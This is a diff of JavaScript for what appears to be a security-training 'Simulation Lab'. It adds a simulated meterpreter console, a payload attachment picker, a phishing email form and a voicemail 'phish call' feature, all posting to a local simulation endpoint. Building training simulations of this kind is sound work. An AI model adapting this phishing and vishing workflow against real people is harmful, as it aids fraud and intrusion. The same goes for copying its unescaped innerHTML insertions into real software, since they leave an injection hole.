+            attachmentStatus.textContent = 'Checking for newly generated files...';
+        }
+        window.fetch('/simulation.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: new URLSearchParams({target: 'payload_refresh'}),
+        })
+            .then((resp) => resp.json())
+            .then((data) => {
+                if (!Array.isArray(data.files)) {
+                    throw new Error('Invalid payload');
+                }
+                attachmentSelect.innerHTML = '';
+                data.files.forEach((fileName) => {
+                    const option = document.createElement('option');
+                    option.value = fileName;
+                    option.textContent = fileName;
+                    attachmentSelect.appendChild(option);
+                });
+                if (attachmentStatus) {
+                    attachmentStatus.textContent = data.files.length === 0
+                        ? 'No files found. Generate a payload first.'
+                        : 'Attachment list refreshed.';
+                }
+            })
+            .catch(() => {
+                if (attachmentStatus) {
+                    attachmentStatus.textContent = 'Unable to refresh attachment list.';
+                }
+            });
+    });
+})();
+
+(() => {
+    const container = document.getElementById('meterpreter-terminal');
+    if (!container) return;
+    const FitAddonClass = window.FitAddon?.FitAddon || window.fitAddon?.FitAddon;
+    const meterpreterTerm = new window.Terminal({
+        theme: {
+            background: '#05060a',
+            foreground: '#e2f3ff',
+            cursor: '#00ffc6',
+        },
+        fontSize: 14,
+        rows: 16,
+        convertEol: false,
+    });
+    meterpreterTerm.open(container);
+    if (FitAddonClass) {
+        const fit = new FitAddonClass();
+        meterpreterTerm.loadAddon(fit);
+        fit.fit();
+        window.addEventListener('resize', () => fit.fit());
+    }
+    const prompt = 'meterpreter > ';
+    let buffer = '';
+    const history = [];
+    let historyIndex = 0;
+    let rowsRendered = 0;
+
+    const moveCursorStart = () => {
+        if (rowsRendered > 0) {
+            meterpreterTerm.write(`\x1b[${rowsRendered}F`);
+        }
+        meterpreterTerm.write('\r');
+    };
+
+    const clearRendered = () => {
+        moveCursorStart();
+        for (let i = 0; i <= rowsRendered; i++) {
+            meterpreterTerm.write('\x1b[2K\r');
+            if (i < rowsRendered) {
+                meterpreterTerm.write('\x1b[1B');
+            }
+        }
+        if (rowsRendered > 0) {
+            meterpreterTerm.write(`\x1b[${rowsRendered}A`);
+        }
+    };
+
+    const renderLine = () => {
+        clearRendered();
+        meterpreterTerm.write(`${prompt}${buffer}`);
+        const cols = meterpreterTerm.cols || 80;
+        rowsRendered = Math.floor((prompt.length + buffer.length) / cols);
+    };
+
+    const writePrompt = (prepend = false) => {
+        buffer = '';
+        historyIndex = history.length;
+        rowsRendered = 0;
+        if (prepend) {
+            meterpreterTerm.write('\r\n');
+        }
+        meterpreterTerm.write(prompt);
+    };
+
+    const sendCommand = (command) => {
+        return window.fetch('/simulation.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: new URLSearchParams({command, target: 'meterpreter'}),
+        })
+            .then((resp) => resp.json())
+            .then((data) => {
+                if (data.clear) {
+                    meterpreterTerm.clear();
+                }
+                if (data.output) {
+                    meterpreterTerm.writeln(data.output);
+                }
+                writePrompt(true);
+            })
+            .catch(() => {
+                meterpreterTerm.writeln('Error: meterpreter channel unreachable.');
+                writePrompt(true);
+            });
+    };
+
+    meterpreterTerm.onKey(({key, domEvent}) => {
+        const printable = !domEvent.altKey && !domEvent.ctrlKey && !domEvent.metaKey;
+        if (domEvent.key === 'Enter') {
+            domEvent.preventDefault();
+            const commandText = buffer;
+            clearRendered();
+            meterpreterTerm.write(`${prompt}${commandText}\r\n`);
+            const trimmed = commandText.trim();
+            if (trimmed.length > 0) {
+                history.push(trimmed);
+                historyIndex = history.length;
+            }
+            sendCommand(commandText);
+        } else if (domEvent.key === 'Backspace') {
+            domEvent.preventDefault();
+            if (buffer.length > 0) {
+                buffer = buffer.slice(0, -1);
+                renderLine();
+            }
+        } else if (domEvent.key === 'ArrowUp') {
+            domEvent.preventDefault();
+            if (history.length === 0) return;
+            if (historyIndex > 0) {
+                historyIndex -= 1;
+            }
+            buffer = history[historyIndex] ?? '';
+            renderLine();
+        } else if (domEvent.key === 'ArrowDown') {
+            domEvent.preventDefault();
+            if (historyIndex < history.length - 1) {
+                historyIndex += 1;
+                buffer = history[historyIndex] ?? '';
+            } else {
+                historyIndex = history.length;
+                buffer = '';
+            }
+            renderLine();
+        } else if ((domEvent.ctrlKey || domEvent.metaKey) && domEvent.key.toLowerCase() === 'v') {
+            if (navigator.clipboard?.readText) {
+                navigator.clipboard.readText().then((text) => {
+                    if (!text) return;
+                    buffer += text.replace(/\r/g, '');
+                    renderLine();
+                }).catch(() => {});
+            }
+        } else if (printable && key.length === 1) {
+            buffer += key;
+            renderLine();
+        }
+    });
+
+    writePrompt(false);
+    sendCommand('');
+})();
+
+(() => {
+    const refreshButton = document.getElementById('meterpreter-refresh-button');
+    if (!refreshButton) return;
+    refreshButton.addEventListener('click', () => {
+        refreshButton.disabled = true;
+        refreshButton.textContent = 'Refreshing...';
+        window.location.reload();
+    });
+})();
+
+(() => {
     document.querySelectorAll('.copy-cmd').forEach((button) => {
         button.addEventListener('click', () => {
             const command = button.dataset.command || '';
             if (!command) return;
-            navigator.clipboard?.writeText(command).then(() => {
+            if (!navigator.clipboard?.writeText) {
+                return;
+            }
+            navigator.clipboard.writeText(command).then(() => {
                 button.classList.add('copied');
                 setTimeout(() => button.classList.remove('copied'), 1200);
             }).catch(() => {});
         });
+    });
+})();
+
+(() => {
+    const phishForm = document.getElementById('phishing-form');
+    if (!phishForm) return;
+    const statusEl = document.getElementById('phishing-status');
+    const logEl = document.getElementById('phishing-log');
+    const submitBtn = phishForm.querySelector('button[type="submit"]');
+
+    const updateLog = (details) => {
+        if (!logEl) return;
+        logEl.innerHTML = '';
+        const heading = document.createElement('strong');
+        heading.textContent = 'Latest delivery';
+        logEl.appendChild(heading);
+
+        const meta = document.createElement('p');
+        meta.textContent = `${details.sent_label ?? 'Just now'} → ${details.to ?? 'jdoe@zegodefense.com'}`;
+        logEl.appendChild(meta);
+
+        if (details.subject) {
+            const subjectRow = document.createElement('p');
+            subjectRow.innerHTML = `<em>Subject:</em> ${details.subject}`;
+            logEl.appendChild(subjectRow);
+        }
+        if (details.attachment) {
+            const attachmentRow = document.createElement('p');
+            attachmentRow.innerHTML = `<em>Attachment:</em> ${details.attachment}`;
+            logEl.appendChild(attachmentRow);
+        }
+    };
+
+    phishForm.addEventListener('submit', (event) => {
+        event.preventDefault();
+        if (submitBtn) {
+            submitBtn.disabled = true;
+        }
+        if (statusEl) {
+            statusEl.textContent = 'Simulating secure mail transfer...';
+        }
+        const formData = new FormData(phishForm);
+        const payload = new URLSearchParams();
+        formData.forEach((value, key) => {
+            payload.append(key, typeof value === 'string' ? value : String(value));
+        });
+        payload.append('target', 'phish');
+
+        fetch('/simulation.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: payload,
+        })
+            .then((resp) => resp.json())
+            .then((data) => {
+                if (statusEl) {
+                    statusEl.textContent = data.message || 'Relay responded.';
+                }
+                if (data.success && data.details) {
+                    updateLog(data.details);
+                    const callButton = document.getElementById('phish-call-button');
+                    if (callButton) {
+                        callButton.disabled = false;
+                    }
+                    const callStatus = document.getElementById('phish-call-status');
+                    if (callStatus && !callStatus.textContent?.startsWith('Last call')) {
+                        callStatus.textContent = 'Line armed. Drop the voicemail when ready.';
+                    }
+                }
+            })
+            .catch(() => {
+                if (statusEl) {
+                    statusEl.textContent = 'Unable to reach the phishing relay.';
+                }
+            })
+            .finally(() => {
+                if (submitBtn) {
+                    submitBtn.disabled = false;
+                }
+            });
+    });
+})();
+
+(() => {
+    const callButton = document.getElementById('phish-call-button');
+    if (!callButton) return;
+    const statusEl = document.getElementById('phish-call-status');
+    const logEl = document.getElementById('phish-call-log');
+    const voicemailSelect = document.getElementById('phish-voicemail-select');
+    const voicemailAudio = document.getElementById('phish-voicemail-audio');
+    const voicemailBank = window.__voicemailBank || [];
+
+    const updateCallLog = (details) => {
+        if (!logEl) return;
+        logEl.innerHTML = '';
+        const heading = document.createElement('strong');
+        heading.textContent = 'Most recent voicemail';
+        logEl.appendChild(heading);
+        const timeRow = document.createElement('p');
+        timeRow.textContent = details.timestamp ?? 'Just now';
+        logEl.appendChild(timeRow);
+        if (details.voicemail_label) {
+            const labelRow = document.createElement('p');
+            labelRow.innerHTML = `<em>Clip:</em> ${details.voicemail_label}`;
+            logEl.appendChild(labelRow);
+        }
+        const scriptRow = document.createElement('p');
+        scriptRow.textContent = details.script ?? '';
+        logEl.appendChild(scriptRow);
+    };
+
+    callButton.addEventListener('click', () => {
+        if (callButton.disabled) return;
+        const selectedId = voicemailSelect?.value || '';
+        const selectedEntry = voicemailBank.find((vm) => vm.id === selectedId);
+        if (!selectedEntry) {
+            if (statusEl) {
+                statusEl.textContent = 'Select a generated voicemail before calling.';
+            }
+            return;
+        }
+        callButton.disabled = true;
+        if (statusEl) {
+            statusEl.textContent = 'Dialing target, please wait...';
+        }
+        const payload = new URLSearchParams({
+            target: 'phish_call',
+            script: selectedEntry.script ?? '',
+            voicemail_label: selectedEntry.label,
+        });
+        fetch('/simulation.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: payload,
+        })
+            .then((resp) => resp.json())
+            .then((data) => {
+                if (statusEl) {
+                    statusEl.textContent = data.message || 'Call completed.';
+                }
+                if (data.success && data.details) {
+                    updateCallLog(data.details);
+                    if (voicemailAudio && selectedEntry) {
+                        voicemailAudio.hidden = false;
+                        voicemailAudio.src = selectedEntry.src;
+                    }
+                }
+            })
+            .catch(() => {
+                if (statusEl) {
+                    statusEl.textContent = 'Unable to reach the switchboard.';
+                }
+            })
+            .finally(() => {
+                callButton.disabled = false;
+            });
     });
 })();
 
@@ -1320,7 +2289,7 @@ render_header('Simulation Lab');
     writePayloadPrompt(false);
 
     psTerm.onPaste?.((data) => {
-        if (!data) return;
+            if (!data) return;
         payloadBuffer += data.replace(/\r/g, '');
         renderPayloadLine();
     });
